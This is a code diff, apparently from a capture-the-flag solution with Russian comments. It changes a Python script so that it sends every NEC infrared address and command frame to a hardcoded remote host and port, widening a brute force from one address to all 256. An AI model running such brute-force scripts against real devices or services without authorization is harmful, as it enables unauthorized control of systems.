@@ -163,31 +163,36 @@ import time
 HOST = '154.57.164.72'
 PORT = 30241
 
-def send_ir_brute():
-    # Для адреса 0x00 инверсия равна 0xFF. Пакет всегда стартует с "00ff"
-    addr = 0x00
-    inv_addr = (~addr) & 0xFF
-    
-    print("[*] Запуск трансляции ИК-команд. Включи симулятор в браузере и наблюдай!")
-    
+def full_nec_brute():
+    print("[*] Запуск тотального перебора всех адресов и команд протокола NEC IR...")
     try:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             s.connect((HOST, PORT))
             
-            for cmd in range(256):
-                inv_cmd = (~cmd) & 0xFF
+            # Перебираем все возможные адреса устройства от 0x00 до 0xFF
+            for addr in range(256):
+                inv_addr = (~addr) & 0xFF
+                print(f"[*] Сканируем адрес: {hex(addr)}...")
                 
-                # Собираем классический HEX-вид NEC IR кадра
-                hex_str = f"{addr:02x}{inv_addr:02x}{cmd:02x}{inv_cmd:02x}\n"
+                payload_chunk = []
+                # Для каждого адреса генерируем все 256 команд
+                for cmd in range(256):
+                    inv_cmd = (~cmd) & 0xFF
+                    
+                    # Стандартный формат NEC: [Addr][~Addr][Cmd][~Cmd]\n
+                    hex_str = f"{addr:02x}{inv_addr:02x}{cmd:02x}{inv_cmd:02x}\n"
+                    payload_chunk.append(hex_str.encode())
                 
-                s.sendall(hex_str.encode())
-                print(f"[*] Отправлен ИК-код: {hex_str.strip()} (Команда: {hex(cmd)})")
+                # Отправляем всю пачку из 256 команд для одного адреса за один раз
+                s.sendall(b"".join(payload_chunk))
                 
-                # Небольшая пауза между "нажатиями" кнопок на пульте
-                time.sleep(0.1)
+                # Крошечная пауза, чтобы буфер докера успевал переваривать данные
+                time.sleep(0.05)
                 
+            print("[*] Перебор завершен. Проверь состояние веб-интерфейса.")
+            
     except Exception as e:
-        print(f"[-] Ошибка подключения: {e}")
+        print(f"[-] Произошла ошибка сети: {e}")
 
 if __name__ == "__main__":
-    send_ir_brute()
+    full_nec_brute()
